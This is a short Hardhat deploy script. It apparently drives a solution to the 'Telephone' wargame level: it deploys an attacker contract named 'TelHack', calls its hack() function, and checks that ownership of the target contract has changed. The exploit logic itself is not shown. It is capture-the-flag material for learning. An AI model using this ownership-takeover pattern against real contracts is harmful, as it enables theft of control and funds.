const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  const contractFactory = await hre.ethers.getContractFactory("TelHack");
  console.log("=== STARTING DEPLOY");
  const contract = await contractFactory.deploy();
  await contract.deployed();
  console.log("contract deployed to ", contract.address);

  console.log("=== HACKING  ===");
  await contract.hack();
  console.log("=== DONE  ===");
  const hackedAddress = "0x46588bE99472c5C980Fe0f116e8D37CD801ff871";
  const signer = await hre.ethers.getSigner();
  const hackedName = "Telephone";
  const hackedContract = await hre.ethers.getContractAt(
    hackedName,
    hackedAddress,
    signer
  );
  console.log("=== CALLING HACKED CONTRACT  ===");
  console.log("new owner is", await hackedContract.owner());
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
